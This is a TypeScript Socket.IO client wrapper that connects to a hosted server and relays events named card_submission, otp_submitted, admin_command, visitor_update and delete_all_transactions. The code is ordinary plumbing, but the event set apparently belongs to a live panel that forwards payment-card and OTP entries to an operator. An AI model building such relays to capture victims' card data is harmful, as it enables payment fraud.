import io from 'socket.io-client';

const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
const protocol = window.location.protocol === "https:" ? "https" : "http";
const socketUrl = isLocalhost
  ? `${protocol}://localhost:8080`
  : `https://maniax49.onrender.com`;

class WSClient {
  private listeners: { [type: string]: Array<(payload: any) => void> } = {};
  socket: any;

  constructor() {
    this.socket = io(socketUrl, { 
      withCredentials: true, 
      transports: ['websocket', 'polling'], // Allow fallback to polling
      timeout: 30000 // Increased timeout 
    });
    
    this.socket.on('connect', () => {
      console.log('Socket.IO connected');
    });

    this.socket.on('disconnect', () => {
      console.log('Socket.IO disconnected');
    });

    // Add proper error handling
    this.socket.on('connect_error', (error: any) => {
      console.error('Socket.IO connection error:', error);
    });

    this.socket.on('connect_timeout', () => {
      console.error('Socket.IO connection timeout');
    });

    this.socket.on('error', (error: any) => {
      console.error('Socket.IO error:', error);
    });

    // Listen for all relayed events
    const RELAY_EVENTS = [
      'card_submission',
      'admin_command',
      'otp_submitted',
      'delete_all_transactions',
      'visitor_update',
      'visitor_left',
      'start_chat',
      'chat_message'
    ];

    RELAY_EVENTS.forEach((event) => {
      this.socket.on(event, (payload) => {
        console.log(`Received event: ${event}`, payload);
        if (this.listeners[event]) {
          this.listeners[event].forEach((cb) => cb(payload));
        }
      });
    });
  }

  send(type: string, payload: any) {
    if (!this.socket.connected) {
      console.warn('Socket not connected, attempting to reconnect...');
      this.connect();
    }
    
    console.log(`Sending event: ${type}`, payload);
    this.socket.emit(type, payload);
  }

  connect() {
    if (!this.socket.connected) {
      console.log('Attempting to connect socket...');
      this.socket.connect();
    }
  }

  disconnect() {
    if (this.socket.connected) {
      this.socket.disconnect();
    }
  }

  getSocketId() {
    return this.socket.id;
  }

  isConnected() {
    return this.socket.connected;
  }

  on(type: string, cb: (payload: any) => void) {
    console.log(`Registering listener for ${type}`);
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(cb);
  }

  off(type: string, cb: (payload: any) => void) {
    console.log(`Removing listener for ${type}`);
    if (this.listeners[type]) {
      this.listeners[type] = this.listeners[type].filter((fn) => fn !== cb);
    }
  }
}

export const wsClient = new WSClient();
